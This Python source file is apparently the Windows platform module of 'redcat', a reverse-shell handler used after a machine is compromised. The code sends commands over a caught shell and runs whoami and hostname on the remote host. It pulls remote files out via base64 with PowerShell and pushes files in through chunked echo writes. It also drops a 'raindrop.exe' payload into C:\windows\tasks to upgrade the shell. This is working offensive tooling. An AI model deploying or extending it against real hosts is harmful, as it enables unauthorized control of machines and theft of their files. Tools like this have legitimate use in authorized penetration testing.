import base64
import os
import typing
import tty
import termios
import sys
import shlex
import time

import redcat.style
import redcat.channel
import redcat.transaction
import redcat.platform
import redcat.payloads


class Windows(redcat.platform.Platform):

    def __init__(self, chan: redcat.channel.Channel) -> None:
        super().__init__(chan, redcat.platform.WINDOWS)

    def build_transaction(self, payload: bytes, start: bytes, end: bytes, control: bytes) -> bytes:
        buffer = b""
        if self._has_pty:
            buffer = b"echo %b & (%b && echo %b) & echo %b\r" % (start, payload, control, end)
        else:
            buffer = b"echo %b & (%b && echo %b) & echo %b\r\n" % (start, payload, control, end)
        return buffer

    def whoami(self) -> typing.Tuple[bool, bool, str]:
        self.channel.purge()
        res, cmd_success, data = redcat.transaction.Transaction(f"whoami".encode(), self, True).execute()
        if not cmd_success:
            data = b""
        return res, cmd_success, data.decode("utf-8").replace("\r", "").replace("\n", "").strip()

    def hostname(self) -> typing.Tuple[bool, bool, str]:
        self.channel.purge()
        res, cmd_success, data = redcat.transaction.Transaction(f"hostname".encode(), self, True).execute()
        if not cmd_success:
            data = b""
        return res, cmd_success, data.decode("utf-8").replace("\r", "").replace("\n", "").strip()

    def download(self, rfile: str) -> typing.Tuple[bool, str, bytes]:
        cmd_success = False
        error = redcat.style.bold("failed to download remote file ") + redcat.style.bold(redcat.style.red(f"{rfile}"))
        data = b""
        self.channel.purge()
        with self.channel.transaction_lock:
            res, cmd_success, data = redcat.transaction.Transaction(f"dir {rfile}".encode(), self, True).execute()
            if not cmd_success:
                res = False
                error = redcat.style.bold("can't download " + redcat.style.red(f"{rfile}") + ": " + data.decode("utf-8"))
            else:
                cmd = f"powershell -c \"[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('{rfile}'))\""
                res, cmd_success, data = redcat.transaction.Transaction(cmd.encode(), self, True).execute()
                if res and cmd_success:
                    data = base64.b64decode(data)
                    error = ""
                else:
                    error = redcat.style.bold("failed to download " + redcat.style.red(f"{rfile}") + ": " + data.decode("utf-8"))
        return cmd_success, error, data

    def upload(self, rfile: str, data: bytes) -> typing.Tuple[bool, str]:
        cmd_success = False
        error = redcat.style.bold("Failed to upload file ") + redcat.style.bold(redcat.style.red(f"{rfile}")) 
        self.channel.purge()
        encoded = base64.b64encode(data)
        # devide encoded data into chunks of 2048 bytes at most
        n = 4096
        chunks = [encoded[i:i+n] for i in range(0, len(encoded), n)]
        # then for each chunk execute a transaction to write into a temporary file
        # the lock is used for performance -> starve the session reader main loop 
        with self.channel.transaction_lock:
            length = len(chunks) 
            tmp_file = base64.b64encode(os.urandom(16)).decode("utf-8").replace("/", "_").replace("=", "0") + ".tmp"
            parent = os.path.dirname(rfile)
            if parent:
                tmp_file = f"{parent}/{tmp_file}"
            tmp_file = shlex.quote(tmp_file).replace("'", "\"")
            res, cmd_success, data = redcat.transaction.Transaction(f"echo \"\" > {tmp_file}".encode(), self, True).execute()
            if not cmd_success:
                res = False
                error = redcat.style.bold("can't upload " + redcat.style.red(f"{rfile}") + ": " + data.decode("utf-8"))
            else:
                redcat.style.print_progress_bar(0, length, prefix = f"Upload {rfile}:", suffix = "Complete", length = 50)
                res, cmd_success, _ =  redcat.transaction.Transaction(b"echo " + chunks[0] + f" > {tmp_file}".encode(), self, True).execute()
                if cmd_success:
                    i = 1
                    redcat.style.print_progress_bar(i, length, prefix = f"Upload {rfile}:", suffix = "Complete", length = 50)
                    if length > 1:
                        for chunk in chunks[1:]:
                            i += 1
                            res, cmd_success, _ = redcat.transaction.Transaction(b"echo " + chunk + f" >> {tmp_file}".encode(), self, True).execute()
                            if not cmd_success:
                                break
                            redcat.style.print_progress_bar(i, length, prefix = f"Upload {rfile}:", suffix = "Complete", length = 50)
                print()
                if cmd_success:
                    # decode the temporary file into the final file and delete the temporary file
                    cmd = f"powershell -c \"[System.Convert]::FromBase64String((Get-Content -Path '{tmp_file}')) | Set-Content -Path '{rfile}' -Encoding Byte\""
                    res, cmd_success, data = redcat.transaction.Transaction(cmd.encode(), self, True).execute()
                if res:
                    redcat.transaction.Transaction(f"del {tmp_file}".encode(), self, True).execute()
                if cmd_success:
                    error = ""
                else:
                    error = redcat.style.bold("failed to upload ") + redcat.style.bold(redcat.style.red(f"{rfile}")) + redcat.style.bold(": " + data.decode("utf-8"))
        return cmd_success, error

    def upgrade(self) -> typing.Tuple[bool, str]:
        if not self._has_pty:
            res = False
            error = redcat.style.bold("Raindrop didn't manage to spawn a pty")
            raindrop_local_path = redcat.payloads.get_payload_path("raindrop.exe")
            raindrop_remote_path = "C:\\windows\\tasks\\raindrop.exe"
            with open(raindrop_local_path, "rb") as f:
                data = f.read()
                self.send_cmd(f"del {raindrop_remote_path}")
                cmd_success, error = self.upload(f"{raindrop_remote_path}", data)
            if cmd_success:
                success_msg = b"SUCCESS: pty ready!\n"
                self.channel.purge()
                columns, rows = os.get_terminal_size(0) 
                upgrade_cmd = f"{' '.join([raindrop_remote_path, 'cmd', str(rows), str(columns)])}"
                self.send_cmd(upgrade_cmd)
                rdata = b""
                timeout = 10
                timed_out = False
                start_time = time.time()
                end_time = 0
                while (success_msg not in rdata) and (not timed_out):
                    resp = self.channel.retrieve()
                    rdata += resp
                    end_time = time.time()
                    if end_time - start_time > timeout:
                        timed_out = True
                        error = redcat.style.bold("Raindrop didn't manage to spawn a pty")
                    else:
                        time.sleep(0.1)
                if not timed_out:
                    self._has_pty = True
                    time.sleep(0.3)
                    self.channel.purge()
                    self.send_cmd("powershell")
                    self.send_cmd("cmd")
                    self._saved_settings = termios.tcgetattr(sys.stdin.fileno())
            else:
                error += f"\n{redcat.style.bold('Shell upgrade failed')}"
        return cmd_success, error

    @redcat.platform.Platform._with_lock
    def interactive(self, value: bool, session_id: str = None, raw:bool =True) -> bool:
        if self._has_pty:
            if value:
                self._saved_settings = termios.tcgetattr(sys.stdin.fileno())
                res, _ = self.send_cmd("exit")
                res, _ = self.send_cmd("\x03")
                self.channel.wait_data(1)
                self.channel.purge()
                res, _ = self.send_cmd("cls", end="\r")
                tty.setraw(sys.stdin.fileno())
                self._raw = True
                self._interactive = True
            else:
                res, _ = self.send_cmd("\x03")
                if res and self.channel.is_open:
                    # use cmd shell when backgrounded
                    # we can't just call exit because user may have called another shell
                    res, _ = self.send_cmd("cmd")
                    res, _ = self.send_cmd("set PROMPT= ")
                    self.channel.wait_data(1)
                    time.sleep(0.1)
                    self.channel.purge()
                    termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, self._saved_settings)
                    self._interactive = False
                    self._raw = False
        else:
            self.channel.wait_data(0.3)
            time.sleep(0.2)
            self._interactive = value
            self.channel.purge()
            res, _ = self.send_cmd("")
            self._raw = False
        return res

    def send_cmd(self, cmd: str, end="\r\n", wait_for: int = 0.1) -> typing.Tuple[bool, str]:
        res, error = self.channel.send(f"{cmd}{end}".encode())
        time.sleep(wait_for)
        return res, error